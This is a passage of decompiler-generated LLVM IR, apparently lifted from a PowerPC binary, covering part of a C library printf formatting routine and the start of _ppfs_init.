  %v2_1000cfac = sub i32 %v1_1000cfac, %v1_1000cf08
  store i32 %v2_1000cfac, i32* %r29.global-to-local, align 4
  br i1 %v3_1000cfa8, label %dec_label_pc_1000d144thread-pre-split, label %dec_label_pc_1000d124

dec_label_pc_1000cfb8:                            ; preds = %dec_label_pc_1000cdd8
  br i1 %v2_1000cfb8, label %dec_label_pc_1000cfec, label %dec_label_pc_1000cfc0

dec_label_pc_1000cfc0:                            ; preds = %dec_label_pc_1000cfb8
  %v3_1000cfc0 = load i32, i32* %stack_var_-344, align 4
  %v0_1000cfcc = load i32, i32* %r24.global-to-local, align 4
  store i32 268488668, i32* @lr, align 4
  %v5_1000cfd8 = call i32 @_fpmaxtostr(i32 %v0_1000cfcc, i32* nonnull %stack_var_-196, i32 268487604, i32 %v3_1000cfc0)
  %v1_1000cfdc = icmp slt i32 %v5_1000cfd8, 0
  br i1 %v1_1000cfdc, label %dec_label_pc_1000d2a8, label %dec_label_pc_1000cfe4

dec_label_pc_1000cfe4:                            ; preds = %dec_label_pc_1000cfc0
  %v0_1000cfe4 = load i32, i32* %r23.global-to-local, align 4
  %v2_1000cfe4 = add i32 %v0_1000cfe4, %v5_1000cfd8
  store i32 %v2_1000cfe4, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_1000d294

dec_label_pc_1000cfec:                            ; preds = %dec_label_pc_1000cfb8
  br i1 %v2_1000cfec, label %dec_label_pc_1000d094, label %dec_label_pc_1000cff4

dec_label_pc_1000cff4:                            ; preds = %dec_label_pc_1000cfec
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v3_1000d000 = load i32, i32* %stack_var_-344, align 4
  %v1_1000d008 = inttoptr i32 %v3_1000d000 to i32*
  %v2_1000d008 = load i32, i32* %v1_1000d008, align 4
  br i1 %v3_1000cfec, label %dec_label_pc_1000d008, label %dec_label_pc_1000d05c

dec_label_pc_1000d008:                            ; preds = %dec_label_pc_1000cff4
  store i32 %v2_1000d008, i32* %r0.global-to-local, align 4
  %v3_1000d00c = icmp eq i32 %v2_1000d008, 0
  store i32 %v2_1000d008, i32* %stack_var_-340, align 4
  br i1 %v3_1000d00c, label %dec_label_pc_1000d12c, label %dec_label_pc_1000d018

dec_label_pc_1000d018:                            ; preds = %dec_label_pc_1000d008
  %v3_1000d018 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000d018, i32* %r0.global-to-local, align 4
  %v1_1000d020 = icmp slt i32 %v3_1000d018, 0
  br i1 %v1_1000d020, label %dec_label_pc_1000d02c, label %dec_label_pc_1000d028

dec_label_pc_1000d028:                            ; preds = %dec_label_pc_1000d018
  br label %dec_label_pc_1000d02c

dec_label_pc_1000d02c:                            ; preds = %dec_label_pc_1000d018, %dec_label_pc_1000d028
  %storemerge94 = phi i32 [ %v3_1000d018, %dec_label_pc_1000d028 ], [ -1, %dec_label_pc_1000d018 ]
  store i32 %storemerge94, i32* @r5, align 4
  store i32 %v2_1000d02c, i32* @r3, align 4
  store i32 %v2_1000d030, i32* @r6, align 4
  store i32 %v2_1000d02c, i32* @r4, align 4
  store i32 268488764, i32* @lr, align 4
  %v0_1000d038 = call i32 @__GI_wcsrtombs()
  %v3_1000d03c = icmp eq i32 %v0_1000d038, -1
  store i32 %v0_1000d038, i32* @r31, align 4
  br i1 %v3_1000d03c, label %dec_label_pc_1000d2a8, label %dec_label_pc_1000d048

dec_label_pc_1000d048:                            ; preds = %dec_label_pc_1000d02c
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000d144

dec_label_pc_1000d05c:                            ; preds = %dec_label_pc_1000cff4
  store i32 %v2_1000d10c, i32* @r28, align 4
  store i32 268488816, i32* @lr, align 4
  %v3_1000d06c = call i32 @__GI_wcrtomb(i32 %v2_1000d10c, i32 %v2_1000d008, i32 %v2_1000d030)
  %v3_1000d070 = icmp eq i32 %v3_1000d06c, -1
  store i32 %v3_1000d06c, i32* @r31, align 4
  br i1 %v3_1000d070, label %dec_label_pc_1000d2a8, label %dec_label_pc_1000d07c

dec_label_pc_1000d07c:                            ; preds = %dec_label_pc_1000d05c
  store i32 %v2_1000d10c, i32* %r30.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  %v0_1000d08c = load i32, i32* @r25, align 4
  %v1_1000d08c = load i32, i32* @r28, align 4
  %v3_1000d08c = trunc i32 %v0_1000d08c to i8
  %v4_1000d08c = add i32 %v1_1000d08c, %v3_1000d06c
  %v5_1000d08c = inttoptr i32 %v4_1000d08c to i8*
  store i8 %v3_1000d08c, i8* %v5_1000d08c, align 1
  %v0_1000d148.pre.pre = load i32, i32* @r31, align 4
  %v1_1000d148.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000d144thread-pre-split

dec_label_pc_1000d094:                            ; preds = %dec_label_pc_1000cfec
  br i1 %v2_1000d094, label %dec_label_pc_1000d100, label %dec_label_pc_1000d09c

dec_label_pc_1000d09c:                            ; preds = %dec_label_pc_1000d094
  %v3_1000d0a0 = load i32, i32* %stack_var_-344, align 4
  %v1_1000d0a8 = inttoptr i32 %v3_1000d0a0 to i32*
  %v2_1000d0a8 = load i32, i32* %v1_1000d0a8, align 4
  br i1 %v3_1000d094, label %dec_label_pc_1000d0a8, label %dec_label_pc_1000d0d8

dec_label_pc_1000d0a8:                            ; preds = %dec_label_pc_1000d09c
  store i32 %v2_1000d0a8, i32* %r30.global-to-local, align 4
  %v3_1000d0ac = icmp eq i32 %v2_1000d0a8, 0
  br i1 %v3_1000d0ac, label %dec_label_pc_1000d12c, label %dec_label_pc_1000d0b4

dec_label_pc_1000d0b4:                            ; preds = %dec_label_pc_1000d0a8, %dec_label_pc_1000d108
  %v0_1000d0c8 = phi i32 [ %v2_1000d0a8, %dec_label_pc_1000d0a8 ], [ %v3_1000d118, %dec_label_pc_1000d108 ]
  %v3_1000d0b4 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000d0b4, i32* %r0.global-to-local, align 4
  %v1_1000d0bc = icmp slt i32 %v3_1000d0b4, 0
  br i1 %v1_1000d0bc, label %dec_label_pc_1000d0c8, label %dec_label_pc_1000d0c4

dec_label_pc_1000d0c4:                            ; preds = %dec_label_pc_1000d0b4
  br label %dec_label_pc_1000d0c8

dec_label_pc_1000d0c8:                            ; preds = %dec_label_pc_1000d0b4, %dec_label_pc_1000d0c4
  %storemerge95 = phi i32 [ %v3_1000d0b4, %dec_label_pc_1000d0c4 ], [ -1, %dec_label_pc_1000d0b4 ]
  store i32 %storemerge95, i32* @r4, align 4
  store i32 268488912, i32* @lr, align 4
  %v1_1000d0cc = inttoptr i32 %v0_1000d0c8 to i8*
  %v2_1000d0cc = call i32 @strnlen(i8* %v1_1000d0cc)
  store i32 %v2_1000d0cc, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d138

dec_label_pc_1000d0d8:                            ; preds = %dec_label_pc_1000d09c
  store i32 1, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 %v2_1000d0a8, i32* %stack_var_-328, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v2_1000d10c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000d144thread-pre-split

dec_label_pc_1000d100:                            ; preds = %dec_label_pc_1000d094
  br i1 %v3_1000d100, label %dec_label_pc_1000d108, label %dec_label_pc_1000d2a8

dec_label_pc_1000d108:                            ; preds = %dec_label_pc_1000d100
  %v0_1000d108 = call i32 @__errno_location()
  %v1_1000d110 = inttoptr i32 %v0_1000d108 to i32*
  %v2_1000d110 = load i32, i32* %v1_1000d110, align 4
  store i32 %v2_1000d110, i32* @r3, align 4
  store i32 128, i32* @r5, align 4
  store i32 268488988, i32* @lr, align 4
  %v3_1000d118 = call i32 @__GI___glibc_strerror_r(i32 %v2_1000d110, i32 %v2_1000d10c, i32 128)
  store i32 %v3_1000d118, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000d0b4

dec_label_pc_1000d124:                            ; preds = %dec_label_pc_1000cfa8, %dec_label_pc_1000cfa0, %dec_label_pc_1000cf88
  %v0_1000d148.pre41 = phi i32 [ %v1_1000cf08, %dec_label_pc_1000cfa8 ], [ 0, %dec_label_pc_1000cfa0 ], [ 5, %dec_label_pc_1000cf88 ]
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000d144thread-pre-split

dec_label_pc_1000d12c:                            ; preds = %dec_label_pc_1000d0a8, %dec_label_pc_1000d008
  store i32 6, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1001944c.719 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000d138

dec_label_pc_1000d138:                            ; preds = %dec_label_pc_1000d0c8, %dec_label_pc_1000d12c
  %v0_1000d14829 = phi i32 [ %v2_1000d0cc, %dec_label_pc_1000d0c8 ], [ 6, %dec_label_pc_1000d12c ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  br label %dec_label_pc_1000d144

dec_label_pc_1000d144thread-pre-split:            ; preds = %dec_label_pc_1000d07c, %dec_label_pc_1000d0d8, %dec_label_pc_1000d124, %dec_label_pc_1000cfa8
  %v1_1000d148.pre = phi i32 [ %v2_1000cfac, %dec_label_pc_1000cfa8 ], [ 0, %dec_label_pc_1000d124 ], [ %v1_1000d148.pre.pre, %dec_label_pc_1000d07c ], [ 0, %dec_label_pc_1000d0d8 ]
  %v0_1000d148.pre = phi i32 [ %v1_1000cf08, %dec_label_pc_1000cfa8 ], [ %v0_1000d148.pre41, %dec_label_pc_1000d124 ], [ %v0_1000d148.pre.pre, %dec_label_pc_1000d07c ], [ 1, %dec_label_pc_1000d0d8 ]
  %stack_var_-184.1.ph = phi i32 [ %stack_var_-184.0, %dec_label_pc_1000cfa8 ], [ %stack_var_-184.0, %dec_label_pc_1000d124 ], [ %v0_1000ceec, %dec_label_pc_1000d07c ], [ %v0_1000ceec, %dec_label_pc_1000d0d8 ]
  %v0_1000d144.pr = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000d144

dec_label_pc_1000d144:                            ; preds = %dec_label_pc_1000d144thread-pre-split, %dec_label_pc_1000d048, %dec_label_pc_1000d138
  %v1_1000d148 = phi i32 [ %v1_1000d148.pre, %dec_label_pc_1000d144thread-pre-split ], [ 0, %dec_label_pc_1000d048 ], [ 0, %dec_label_pc_1000d138 ]
  %v0_1000d148 = phi i32 [ %v0_1000d148.pre, %dec_label_pc_1000d144thread-pre-split ], [ %v0_1000d038, %dec_label_pc_1000d048 ], [ %v0_1000d14829, %dec_label_pc_1000d138 ]
  %v0_1000d150 = phi i32 [ %v0_1000d144.pr, %dec_label_pc_1000d144thread-pre-split ], [ 11, %dec_label_pc_1000d048 ], [ 11, %dec_label_pc_1000d138 ]
  %stack_var_-184.1 = phi i32 [ %stack_var_-184.1.ph, %dec_label_pc_1000d144thread-pre-split ], [ %v0_1000ceec, %dec_label_pc_1000d048 ], [ %v0_1000ceec, %dec_label_pc_1000d138 ]
  %v3_1000d144 = icmp eq i32 %v0_1000d150, 11
  %v2_1000d148 = add i32 %v0_1000d148, %v1_1000d148
  store i32 %v2_1000d148, i32* %r0.global-to-local, align 4
  br i1 %v3_1000d144, label %dec_label_pc_1000d164, label %dec_label_pc_1000d150

dec_label_pc_1000d150:                            ; preds = %dec_label_pc_1000d144
  %v0_1000d154 = call i32 @__asm_mfcr()
  %v1_1000d158 = call i32 @__asm_rlwinm(i32 %v0_1000d154, i32 30, i32 31, i32 31)
  %v1_1000d15c = add i32 %v1_1000d158, 1
  %v0_1000d160 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000d160 = add i32 %v0_1000d160, %v1_1000d15c
  store i32 %v2_1000d160, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000d164

dec_label_pc_1000d164:                            ; preds = %dec_label_pc_1000d144, %dec_label_pc_1000d150
  %v0_1000d17c = phi i32 [ %v2_1000d148, %dec_label_pc_1000d144 ], [ %v2_1000d160, %dec_label_pc_1000d150 ]
  %v3_1000d16c = icmp ugt i32 %tmp, %v0_1000d17c
  br i1 %v3_1000d16c, label %dec_label_pc_1000d174, label %dec_label_pc_1000d178

dec_label_pc_1000d174:                            ; preds = %dec_label_pc_1000d164
  %v2_1000d174 = sub i32 %tmp, %v0_1000d17c
  br label %dec_label_pc_1000d178

dec_label_pc_1000d178:                            ; preds = %dec_label_pc_1000d164, %dec_label_pc_1000d174
  %storemerge93 = phi i32 [ %v2_1000d174, %dec_label_pc_1000d174 ], [ 0, %dec_label_pc_1000d164 ]
  %v1_1000d188 = phi i32 [ %v2_1000d174, %dec_label_pc_1000d174 ], [ 0, %dec_label_pc_1000d164 ]
  store i32 %storemerge93, i32* @r28, align 4
  %v0_1000d178 = load i32, i32* @r26, align 4
  %v3_1000d178 = icmp eq i32 %v0_1000d178, 48
  %v2_1000d17c = add i32 %v1_1000d188, %v0_1000d17c
  store i32 %v2_1000d17c, i32* %r0.global-to-local, align 4
  %v0_1000d180 = load i32, i32* %r23.global-to-local, align 4
  %v2_1000d180 = add i32 %v0_1000d180, %v2_1000d17c
  store i32 %v2_1000d180, i32* %r23.global-to-local, align 4
  br i1 %v3_1000d178, label %dec_label_pc_1000d188, label %dec_label_pc_1000d190

dec_label_pc_1000d188:                            ; preds = %dec_label_pc_1000d178
  %v0_1000d188 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d188 = add i32 %v0_1000d188, %v1_1000d188
  store i32 %v2_1000d188, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000d190

dec_label_pc_1000d190:                            ; preds = %dec_label_pc_1000d178, %dec_label_pc_1000d188
  %v0_1000d1a4 = phi i32 [ %v1_1000d188, %dec_label_pc_1000d178 ], [ 0, %dec_label_pc_1000d188 ]
  store i32 %stack_var_-184.1, i32* %r0.global-to-local, align 4
  %v1_1000d194 = and i32 %stack_var_-184.1, 8
  %v3_1000d194 = icmp eq i32 %v1_1000d194, 0
  br i1 %v3_1000d194, label %dec_label_pc_1000d19c, label %dec_label_pc_1000d1b8

dec_label_pc_1000d19c:                            ; preds = %dec_label_pc_1000d190
  %v0_1000d19c = load i32, i32* %r24.global-to-local, align 4
  store i32 268489132, i32* @lr, align 4
  %v4_1000d1a8 = call i32 @_charpad(i32 %v0_1000d19c, i8 32, i32 %v0_1000d1a4)
  %v1_1000d1ac = load i32, i32* @r28, align 4
  %v4_1000d1ac = icmp eq i32 %v4_1000d1a8, %v1_1000d1ac
  br i1 %v4_1000d1ac, label %dec_label_pc_1000d1b4, label %dec_label_pc_1000d2a8

dec_label_pc_1000d1b4:                            ; preds = %dec_label_pc_1000d19c
  br label %dec_label_pc_1000d1b8

dec_label_pc_1000d1b8:                            ; preds = %dec_label_pc_1000d190, %dec_label_pc_1000d1b4
  %v0_1000d1bc = load i32, i32* %r24.global-to-local, align 4
  %v0_1000d1c4 = load i32, i32* @r27, align 4
  %v2_1000d1c4 = add i32 %v0_1000d1c4, ptrtoint (i32* @global_var_10019454.720 to i32)
  store i32 268489164, i32* @lr, align 4
  %v2_1000d1c8 = call i32 @__GI_fputs_unlocked(i32 %v2_1000d1c4, i32 %v0_1000d1bc)
  %v0_1000d1d4 = load i32, i32* @r29, align 4
  store i32 268489180, i32* @lr, align 4
  %v4_1000d1d8 = call i32 @_charpad(i32 %v0_1000d1bc, i8 48, i32 %v0_1000d1d4)
  %v1_1000d1dc = load i32, i32* @r29, align 4
  %v4_1000d1dc = icmp eq i32 %v4_1000d1d8, %v1_1000d1dc
  br i1 %v4_1000d1dc, label %dec_label_pc_1000d1e4, label %dec_label_pc_1000d2a8

dec_label_pc_1000d1e4:                            ; preds = %dec_label_pc_1000d1b8
  %v3_1000d1e4 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_1000d1e4, i32* %r0.global-to-local, align 4
  %v3_1000d1e8 = icmp eq i32 %v3_1000d1e4, 0
  br i1 %v3_1000d1e8, label %dec_label_pc_1000d1f0, label %dec_label_pc_1000d218

dec_label_pc_1000d1f0:                            ; preds = %dec_label_pc_1000d1e4
  %v0_1000d1f0 = load i32, i32* @r31, align 4
  %v3_1000d1f0 = icmp eq i32 %v0_1000d1f0, 0
  br i1 %v3_1000d1f0, label %dec_label_pc_1000d20c.thread, label %dec_label_pc_1000d20c

dec_label_pc_1000d20c.thread:                     ; preds = %dec_label_pc_1000d1f0
  br label %dec_label_pc_1000d27c

dec_label_pc_1000d20c:                            ; preds = %dec_label_pc_1000d1f0
  %v0_1000d1fc = load i32, i32* @r30, align 4
  %v0_1000d204 = load i32, i32* %r24.global-to-local, align 4
  store i32 268489228, i32* @lr, align 4
  %v4_1000d208 = inttoptr i32 %v0_1000d204 to i16*
  %v5_1000d208 = call i32 @__stdio_fwrite(i32 %v0_1000d1fc, i32 %v0_1000d1f0, i16* %v4_1000d208)
  %v1_1000d20c.pre = load i32, i32* @r31, align 4
  %v4_1000d20c = icmp eq i32 %v5_1000d208, %v1_1000d20c.pre
  br i1 %v4_1000d20c, label %dec_label_pc_1000d27c, label %dec_label_pc_1000d2a8

dec_label_pc_1000d218:                            ; preds = %dec_label_pc_1000d1e4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v0_1000d25c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000d25c

dec_label_pc_1000d224:                            ; preds = %dec_label_pc_1000d25c
  %tmp78 = icmp ult i32 %v0_1000d274, 129
  br i1 %tmp78, label %dec_label_pc_1000d22c, label %dec_label_pc_1000d228

dec_label_pc_1000d228:                            ; preds = %dec_label_pc_1000d224
  store i32 128, i32* @r5, align 4
  br label %dec_label_pc_1000d22c

dec_label_pc_1000d22c:                            ; preds = %dec_label_pc_1000d224, %dec_label_pc_1000d228
  store i32 ptrtoint (i32* @global_var_1000d230.721 to i32), i32* @lr, align 4
  %v0_1000d22c = call i32 @__GI_wcsrtombs()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d22c, i32* @r30, align 4
  %v3_1000d234 = icmp eq i32 %v0_1000d22c, 0
  br i1 %v3_1000d234, label %dec_label_pc_1000d250, label %dec_label_pc_1000d248

dec_label_pc_1000d248:                            ; preds = %dec_label_pc_1000d22c
  %v0_1000d238 = load i32, i32* %r24.global-to-local, align 4
  store i32 268489292, i32* @lr, align 4
  %v3_1000d248 = inttoptr i32 %v0_1000d238 to i16*
  %v4_1000d248 = call i32 @__stdio_fwrite(i32 %v2_1000d10c, i32 %v0_1000d22c, i16* %v3_1000d248)
  store i32 %v4_1000d248, i32* %r0.global-to-local, align 4
  %v1_1000d250.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000d250

dec_label_pc_1000d250:                            ; preds = %dec_label_pc_1000d22c, %dec_label_pc_1000d248
  %v1_1000d250 = phi i32 [ 0, %dec_label_pc_1000d22c ], [ %v1_1000d250.pre, %dec_label_pc_1000d248 ]
  %v0_1000d254 = phi i32 [ 0, %dec_label_pc_1000d22c ], [ %v4_1000d248, %dec_label_pc_1000d248 ]
  %v4_1000d250 = icmp eq i32 %v0_1000d254, %v1_1000d250
  %v1_1000d254 = load i32, i32* @r31, align 4
  %v2_1000d254 = sub i32 %v1_1000d254, %v0_1000d254
  store i32 %v2_1000d254, i32* @r31, align 4
  br i1 %v4_1000d250, label %dec_label_pc_1000d25c, label %dec_label_pc_1000d2a8

dec_label_pc_1000d25c:                            ; preds = %dec_label_pc_1000d250, %dec_label_pc_1000d218
  %v0_1000d274 = phi i32 [ %v2_1000d254, %dec_label_pc_1000d250 ], [ %v0_1000d25c.pre, %dec_label_pc_1000d218 ]
  %v3_1000d25c = icmp eq i32 %v0_1000d274, 0
  store i32 %v2_1000d10c, i32* @r29, align 4
  store i32 %v2_1000d02c, i32* @r4, align 4
  store i32 %v2_1000d030, i32* @r6, align 4
  store i32 %v2_1000d10c, i32* @r3, align 4
  store i32 %v0_1000d274, i32* @r5, align 4
  br i1 %v3_1000d25c, label %dec_label_pc_1000d27c, label %dec_label_pc_1000d224

dec_label_pc_1000d27c:                            ; preds = %dec_label_pc_1000d25c, %dec_label_pc_1000d20c.thread, %dec_label_pc_1000d20c
  %v0_1000d27c = load i32, i32* %r24.global-to-local, align 4
  %v0_1000d284 = load i32, i32* @r28, align 4
  store i32 268489356, i32* @lr, align 4
  %v4_1000d288 = call i32 @_charpad(i32 %v0_1000d27c, i8 32, i32 %v0_1000d284)
  %v1_1000d28c = load i32, i32* @r28, align 4
  %v4_1000d28c = icmp eq i32 %v4_1000d288, %v1_1000d28c
  br i1 %v4_1000d28c, label %dec_label_pc_1000d294, label %dec_label_pc_1000d2a8

dec_label_pc_1000d294:                            ; preds = %dec_label_pc_1000d27c, %dec_label_pc_1000cfe4, %dec_label_pc_1000cdb8
  %stack_var_-184.2 = phi i32 [ %v0_1000ceec, %dec_label_pc_1000cdb8 ], [ %stack_var_-184.1, %dec_label_pc_1000d27c ], [ %v0_1000ceec, %dec_label_pc_1000cfe4 ]
  %v3_1000d294 = load i8*, i8** %stack_var_-200, align 4
  %v4_1000d294 = ptrtoint i8* %v3_1000d294 to i32
  store i32 %v4_1000d294, i32* @r29, align 4
  br label %dec_label_pc_1000d298

dec_label_pc_1000d298:                            ; preds = %dec_label_pc_1000ccac, %dec_label_pc_1000d294
  %v0_1000d298 = phi i32 [ %v0_1000d298.pre, %dec_label_pc_1000ccac ], [ %v4_1000d294, %dec_label_pc_1000d294 ]
  %v0_1000ceec = phi i32 [ %tmp56, %dec_label_pc_1000ccac ], [ %stack_var_-184.2, %dec_label_pc_1000d294 ]
  br label %dec_label_pc_1000ccc4

dec_label_pc_1000d2a8:                            ; preds = %dec_label_pc_1000d100, %dec_label_pc_1000d27c, %dec_label_pc_1000d20c, %dec_label_pc_1000d1b8, %dec_label_pc_1000d19c, %dec_label_pc_1000d05c, %dec_label_pc_1000d02c, %dec_label_pc_1000cfc0, %dec_label_pc_1000cd00, %dec_label_pc_1000d250
  store i32 -1, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_1000d2ac

dec_label_pc_1000d2ac:                            ; preds = %dec_label_pc_1000cd0c, %dec_label_pc_1000cc84, %dec_label_pc_1000cc9c, %dec_label_pc_1000d2a8
  store i32 %v0_1000cc58, i32* %r0.global-to-local, align 4
  %v0_1000d2b0 = load i32, i32* %r23.global-to-local, align 4
  ret i32 %v0_1000d2b0

; uselistorder directives
  uselistorder i32 %v0_1000ceec, { 16, 11, 12, 13, 1, 2, 0, 10, 9, 8, 7, 6, 4, 5, 3, 15, 14 }
  uselistorder i32 %v0_1000d274, { 1, 2, 0 }
  uselistorder i32 %v1_1000d188, { 2, 0, 1 }
  uselistorder i32 %stack_var_-184.1, { 0, 2, 1 }
  uselistorder i32 %v3_1000d118, { 1, 0 }
  uselistorder i32 %v2_1000d0a8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000d008, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-184.0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1000ceec, { 1, 0 }
  uselistorder i32 %v6_1000cea4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v1_1000ce74, { 1, 0 }
  uselistorder i32 %v1_1000ce18, { 1, 0 }
  uselistorder i1 %v2_1000ce0c, { 1, 0 }
  uselistorder i32 %v0_1000cdbc, { 1, 0, 2 }
  uselistorder i32 %v1_1000cda8, { 1, 0 }
  uselistorder i32 %v0_1000cda0, { 1, 0 }
  uselistorder i32 %v1_1000cd9c, { 1, 0 }
  uselistorder i32 %v1_1000cd18, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1000cce0, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1000ccf0, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_1000d10c, { 3, 2, 4, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 %v2_1000cd54, { 1, 2, 0 }
  uselistorder i32 %v4_1000cd4c, { 1, 0 }
  uselistorder i8** %stack_var_-200, { 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp57, { 16, 14, 12, 10, 6, 7, 8, 0, 2, 1, 4, 3, 5, 9, 15, 17, 13, 11 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13 }
  uselistorder i32* %r29.global-to-local, { 0, 7, 1, 2, 3, 4, 5, 6, 8 }
  uselistorder i32* %r24.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r23.global-to-local, { 9, 0, 1, 4, 2, 5, 6, 3, 7, 8, 10 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7 }
  uselistorder i32* %r10.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 0, 37, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i8 32, { 2, 1, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 188, { 1, 0 }
  uselistorder i32 55, { 1, 0 }
  uselistorder i32 87, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000d2ac, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1000d2a8, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_1000d298, { 1, 0 }
  uselistorder label %dec_label_pc_1000d27c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000d250, { 1, 0 }
  uselistorder label %dec_label_pc_1000d22c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d1b8, { 1, 0 }
  uselistorder label %dec_label_pc_1000d190, { 1, 0 }
  uselistorder label %dec_label_pc_1000d178, { 1, 0 }
  uselistorder label %dec_label_pc_1000d164, { 1, 0 }
  uselistorder label %dec_label_pc_1000d144, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000d144thread-pre-split, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000d138, { 1, 0 }
  uselistorder label %dec_label_pc_1000d0c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000d0b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d02c, { 1, 0 }
  uselistorder label %dec_label_pc_1000cf7c, { 1, 0 }
  uselistorder label %dec_label_pc_1000cf64, { 6, 2, 3, 1, 5, 0, 4 }
  uselistorder label %dec_label_pc_1000cf14, { 1, 0 }
  uselistorder label %dec_label_pc_1000cef8, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1000ce84, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce68, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce54, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ce24, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000cdac, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000cd98.dec_label_pc_1000cd98_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd70, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd0c, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd00, { 1, 0 }
  uselistorder label %dec_label_pc_1000ccc4, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_1000d2c8 = load i32, i32* @lr, align 4
  store i32 %v0_1000d2c8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_1000d2d8 = load i32, i32* @r4, align 4
  store i32 %v0_1000d2d8, i32* @r30, align 4
  store i32 268489448, i32* @lr, align 4
  %v3_1000d2e4 = call i32 @__GI_memset(i32 0, i32 160, i32 160)
  %v0_1000d2e8 = load i32, i32* @r31, align 4
  %v1_1000d2e8 = add i32 %v0_1000d2e8, 24
  %v2_1000d2e8 = inttoptr i32 %v1_1000d2e8 to i32*
  %v3_1000d2e8 = load i32, i32* %v2_1000d2e8, align 4
  store i32 %v3_1000d2e8, i32* %r9.global-to-local, align 4
  store i32 9, i32* %r11.global-to-local, align 4
  %v0_1000d2f0 = load i32, i32* @r30, align 4
  %v2_1000d2f0 = inttoptr i32 %v0_1000d2e8 to i32*
  store i32 %v0_1000d2f0, i32* %v2_1000d2f0, align 4
  %v0_1000d2f4 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000d2f4, i32* %ctr.global-to-local, align 4
  %v0_1000d2f8 = load i32, i32* %r9.global-to-local, align 4
